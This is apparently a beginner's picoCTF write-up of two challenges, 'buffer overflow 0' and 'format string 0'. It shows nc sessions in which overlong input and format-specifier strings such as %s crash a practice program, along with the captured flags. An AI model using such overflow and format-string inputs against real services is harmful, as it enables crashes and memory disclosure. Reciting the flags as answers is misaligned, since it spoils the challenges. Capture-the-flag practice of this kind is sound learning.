# Binary exploitation 
## Buffer overflow 0 
So i got very lucky with this one.
The source and the program would not open regardless of what I did. To my computer it simply did not exist. 
So i played around with the program trying to figure out what it was meant to do.
It would exit regardless of what input i gave. The name of the challenge was buffer overflow 0 so the thought process was "What if my input was just very long" cause there had to be a max limit to the input.
Turns out i was right.
I did look at the write up of this online to check the what the source and program were.
```
springonioin-picoctf@webshell:~$ nc saturn.picoctf.net 57620
Input: a
The program will exit now
 
springonioin-picoctf@webshell:~$ nc saturn.picoctf.net 57620
Input: 3
The program will exit now

springonioin-picoctf@webshell:~$ nc saturn.picoctf.net 57620
Input: w7ieyhdw bhjlygfp72
The program will exit now

springonioin-picoctf@webshell:~$ nc saturn.picoctf.net 57620
Input: 249872-398741982hdkeibfwyeugdkq8iw783yr3wuifbq
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```
## format string 0
Hint 2 said "to try out different options. 
While Hint 1 made us look at different format specifiers in C. <br>
```Gr%114d_Cheese```
Looked stood out to me because of the %114d. Its supposed to print a character with 114 characters and it triggers the program to serve Patrick.
Similarly with ```Cla%sic_Che%s%steak```
```
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```
